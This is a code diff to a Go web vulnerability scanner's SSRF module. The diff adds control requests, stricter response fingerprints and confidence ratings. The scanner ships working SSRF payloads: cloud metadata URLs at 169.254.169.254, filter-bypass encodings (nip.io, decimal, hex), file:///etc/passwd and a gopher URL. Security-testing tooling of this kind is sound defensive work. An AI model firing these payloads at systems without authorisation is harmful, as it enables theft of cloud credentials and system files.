@@ -5,6 +5,7 @@ import (
 	"io"
 	"net/http"
 	"net/url"
+	"path"
 	"strings"
 	"sync"
 
@@ -13,9 +14,16 @@ import (
 )
 
 type SSRFPayload struct {
-	Name    string
-	Payload string
-	Check   string 
+	Name     string
+	Payload  string
+	Detector string
+}
+
+var metadataDetectors = map[string]bool{
+	"aws_meta":    true,
+	"azure_meta":  true,
+	"do_meta":     true,
+	"oracle_meta": true,
 }
 
 var SSRFParams = []string{
@@ -26,45 +34,67 @@ var SSRFParams = []string{
 	"action", "command", "exec", "query", "q", "search", "s",
 }
 
+var ssrfStaticExtensions = map[string]bool{
+	".js": true, ".mjs": true, ".css": true, ".map": true,
+	".png": true, ".jpg": true, ".jpeg": true, ".gif": true, ".svg": true, ".ico": true,
+	".woff": true, ".woff2": true, ".ttf": true, ".eot": true,
+	".mp4": true, ".webm": true, ".mp3": true, ".wav": true,
+	".pdf": true, ".zip": true, ".tar": true, ".gz": true,
+}
+
 var SSRFPayloads = []SSRFPayload{
-	{"SSRF Cloud (AWS/GCP)", "http://169.254.169.254/latest/meta-data/", "ami-id"},
-	{"SSRF Cloud (Azure)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "compute"},
-	{"SSRF Cloud (DigitalOcean)", "http://169.254.169.254/metadata/v1.json", "droplet_id"},
-	{"SSRF Cloud (Oracle)", "http://192.0.0.192/1.0/meta-data/", "instance"},
-	{"SSRF Cloud (nip.io bypass)", "http://169.254.169.254.nip.io/latest/meta-data/", "ami-id"},
-	{"SSRF Cloud (Decimal)", "http://2852039166/latest/meta-data/", "ami-id"},
-	{"SSRF Localhost (IPv4)", "http://127.0.0.1:80", "root:x:"}, 
-	{"SSRF Localhost (Hex)", "http://0x7f000001", "root:x:"},
-	{"SSRF Localhost (CIDR)", "http://127.127.127.127", "root:x:"},
-	{"SSRF File Scheme", "file:///etc/passwd", "root:x:"},
-	{"SSRF Gopher (DNS Leak)", "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1", "root:x:"},
+	{"SSRF Cloud (AWS/GCP)", "http://169.254.169.254/latest/meta-data/", "aws_meta"},
+	{"SSRF Cloud (Azure)", "http://169.254.169.254/metadata/instance?api-version=2021-02-01", "azure_meta"},
+	{"SSRF Cloud (DigitalOcean)", "http://169.254.169.254/metadata/v1.json", "do_meta"},
+	{"SSRF Cloud (Oracle)", "http://192.0.0.192/1.0/meta-data/", "oracle_meta"},
+	{"SSRF Cloud (nip.io bypass)", "http://169.254.169.254.nip.io/latest/meta-data/", "aws_meta"},
+	{"SSRF Cloud (Decimal)", "http://2852039166/latest/meta-data/", "aws_meta"},
+	{"SSRF Localhost (IPv4)", "http://127.0.0.1:80", "passwd_file"},
+	{"SSRF Localhost (Hex)", "http://0x7f000001", "passwd_file"},
+	{"SSRF Localhost (CIDR)", "http://127.127.127.127", "passwd_file"},
+	{"SSRF File Scheme", "file:///etc/passwd", "passwd_file"},
+	{"SSRF Gopher (DNS Leak)", "gopher://127.0.0.1:80/_GET%20/ HTTP/1.1", "passwd_file"},
 }
 
 func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
+	if isStaticAssetURL(baseURL) {
+		return
+	}
+
 	u, _ := url.Parse(baseURL)
 	q := u.Query()
 
 	testParams := make(map[string]string)
 	if len(q) == 0 {
 		if strings.Contains(baseURL, "redirect") || strings.Contains(baseURL, "fetch") || strings.Contains(baseURL, "url") {
-			for _, sp := range SSRFParams { testParams[sp] = "1" }
+			for _, sp := range SSRFParams {
+				testParams[sp] = "1"
+			}
 		}
 	} else {
-		for param := range q { testParams[param] = q.Get(param) }
+		for param := range q {
+			if !isSSRFSinkParam(param) {
+				continue
+			}
+			testParams[param] = q.Get(param)
+		}
+	}
+	if len(testParams) == 0 {
+		return
 	}
 
-	reqBase, _ := http.NewRequest("GET", baseURL, nil)
-	utils.SetDefaultHeaders(reqBase, baseURL)
-	baseResp, _ := client.Do(reqBase)
-	baseBody := ""
-	if baseResp != nil {
-		defer baseResp.Body.Close()
-		b, _ := io.ReadAll(baseResp.Body)
-		baseBody = strings.ToLower(string(b))
+	baseBody := fetchBodyLower(client, baseURL)
+	controlBodies := make(map[string]string, len(testParams))
+	for p := range testParams {
+		controlTarget, err := buildSSRFURL(baseURL, testParams, p, "http://127.0.0.1.invalid/bhyakugan-ssrf-control")
+		if err != nil {
+			continue
+		}
+		controlBodies[p] = fetchBodyLower(client, controlTarget)
 	}
 
 	var wg sync.WaitGroup
-	sem := make(chan struct{}, 5) 
+	sem := make(chan struct{}, 5)
 
 	for targetParam := range testParams {
 		for _, payload := range SSRFPayloads {
@@ -74,34 +104,185 @@ func Scan(baseURL string, client *http.Client, onFound func(core.Finding)) {
 				sem <- struct{}{}
 				defer func() { <-sem }()
 
-				fuzzU, _ := url.Parse(baseURL)
-				fuzzQ := fuzzU.Query()
-				for k, v := range testParams { fuzzQ.Set(k, v) }
-				fuzzQ.Set(pName, pay.Payload)
-				fuzzU.RawQuery = fuzzQ.Encode()
-				target := fuzzU.String()
+				target, err := buildSSRFURL(baseURL, testParams, pName, pay.Payload)
+				if err != nil {
+					return
+				}
 
 				req, _ := http.NewRequest("GET", target, nil)
 				utils.SetDefaultHeaders(req, target)
 				resp, err := client.Do(req)
-				if err != nil { return }
+				if err != nil {
+					return
+				}
 				defer resp.Body.Close()
+				// SSRF confirmation heuristics are only meaningful for successful content responses.
+				if resp.StatusCode != http.StatusOK {
+					return
+				}
 
 				bodyBytes, _ := io.ReadAll(resp.Body)
-				bodyStr := strings.ToLower(string(bodyBytes))
+				bodyLower := strings.ToLower(string(bodyBytes))
 
-				if strings.Contains(bodyStr, strings.ToLower(pay.Check)) {
-					if baseBody != "" && strings.Contains(baseBody, strings.ToLower(pay.Check)) { return }
-					
-					onFound(core.Finding{
-						Type:     "SSRF Injection",
-						Target:   target,
-						Detail:   fmt.Sprintf("%s confirmed. Found output '%s'", pay.Name, pay.Check),
-						Severity: "Critical",
-					})
+				if !matchesSSRFFingerprint(pay.Detector, bodyLower) {
+					return
 				}
+				// Control checks: avoid reporting if baseline/control already contains same fingerprint.
+				if baseBody != "" && matchesSSRFFingerprint(pay.Detector, baseBody) {
+					return
+				}
+				if controlBody := controlBodies[pName]; controlBody != "" && matchesSSRFFingerprint(pay.Detector, controlBody) {
+					return
+				}
+
+				severity, confidence, detail := classifySSRFFinding(pay)
+
+				onFound(core.Finding{
+					Type:       "SSRF Injection",
+					Target:     target,
+					Detail:     detail,
+					Severity:   severity,
+					Confidence: confidence,
+				})
 			}(targetParam, payload)
 		}
 	}
 	wg.Wait()
+}
+
+func buildSSRFURL(baseURL string, testParams map[string]string, targetParam, payload string) (string, error) {
+	fuzzU, err := url.Parse(baseURL)
+	if err != nil {
+		return "", err
+	}
+	fuzzQ := fuzzU.Query()
+	for k, v := range testParams {
+		fuzzQ.Set(k, v)
+	}
+	fuzzQ.Set(targetParam, payload)
+	fuzzU.RawQuery = fuzzQ.Encode()
+	return fuzzU.String(), nil
+}
+
+func fetchBodyLower(client *http.Client, target string) string {
+	req, _ := http.NewRequest("GET", target, nil)
+	utils.SetDefaultHeaders(req, target)
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+	return strings.ToLower(string(body))
+}
+
+func matchesSSRFFingerprint(detector, bodyLower string) bool {
+	if bodyLower == "" {
+		return false
+	}
+	if detector != "passwd_file" && isLikelyHTML(bodyLower) {
+		return false
+	}
+	switch detector {
+	case "aws_meta":
+		return countContains(bodyLower, []string{
+			"ami-id", "instance-id", "security-credentials", "local-ipv4", "hostname",
+		}) >= 3
+	case "azure_meta":
+		if !strings.Contains(bodyLower, "compute") {
+			return false
+		}
+		return countContains(bodyLower, []string{
+			"vmid", "subscriptionid", "resourcegroupname", "osprofile",
+		}) >= 2
+	case "do_meta":
+		if !strings.Contains(bodyLower, "droplet_id") {
+			return false
+		}
+		return countContains(bodyLower, []string{
+			"hostname", "interfaces", "region", "floating_ip",
+		}) >= 2
+	case "oracle_meta":
+		// Oracle metadata should expose multiple distinct keys, not just the word "instance".
+		return countContains(bodyLower, []string{
+			"instance-id", "availability-domain", "compartment-id", "canonical-region-name", "shape", "region",
+		}) >= 3
+	case "passwd_file":
+		return strings.Contains(bodyLower, "root:x:0:0:") &&
+			(strings.Contains(bodyLower, "/bin/bash") || strings.Contains(bodyLower, "/bin/sh"))
+	default:
+		return false
+	}
+}
+
+func classifySSRFFinding(pay SSRFPayload) (severity, confidence, detail string) {
+	if metadataDetectors[pay.Detector] {
+		return "Medium", "probable",
+			fmt.Sprintf("%s metadata fingerprint observed (%s). control_validation=true (baseline/control clean), external_callback_validation=false (no DNS/OOB interaction log); treat as medium-confidence signal only until OOB callback or credential exposure is proven.",
+				pay.Name, ssrfDetectorLabel(pay.Detector))
+	}
+	return "High", "confirmed",
+		fmt.Sprintf("%s confirmed via metadata/file fingerprint (%s). control_validation=true (baseline/control clean).",
+			pay.Name, ssrfDetectorLabel(pay.Detector))
+}
+
+func isSSRFSinkParam(param string) bool {
+	p := strings.ToLower(strings.TrimSpace(param))
+	if p == "" {
+		return false
+	}
+	for _, candidate := range SSRFParams {
+		if p == candidate {
+			return true
+		}
+	}
+	if strings.Contains(p, "url") || strings.Contains(p, "uri") || strings.Contains(p, "redirect") || strings.Contains(p, "callback") {
+		return true
+	}
+	return false
+}
+
+func isStaticAssetURL(rawURL string) bool {
+	u, err := url.Parse(strings.TrimSpace(rawURL))
+	if err != nil {
+		return false
+	}
+	ext := strings.ToLower(path.Ext(u.Path))
+	if ext == "" {
+		return false
+	}
+	return ssrfStaticExtensions[ext]
+}
+
+func isLikelyHTML(bodyLower string) bool {
+	return strings.Contains(bodyLower, "<html") ||
+		strings.Contains(bodyLower, "<!doctype") ||
+		strings.Contains(bodyLower, "<body")
+}
+
+func countContains(body string, markers []string) int {
+	count := 0
+	for _, m := range markers {
+		if strings.Contains(body, m) {
+			count++
+		}
+	}
+	return count
+}
+
+func ssrfDetectorLabel(detector string) string {
+	switch detector {
+	case "aws_meta":
+		return "AWS metadata shape"
+	case "azure_meta":
+		return "Azure metadata shape"
+	case "do_meta":
+		return "DigitalOcean metadata shape"
+	case "oracle_meta":
+		return "Oracle metadata key set"
+	case "passwd_file":
+		return "/etc/passwd structure"
+	default:
+		return "generic fingerprint"
+	}
 }
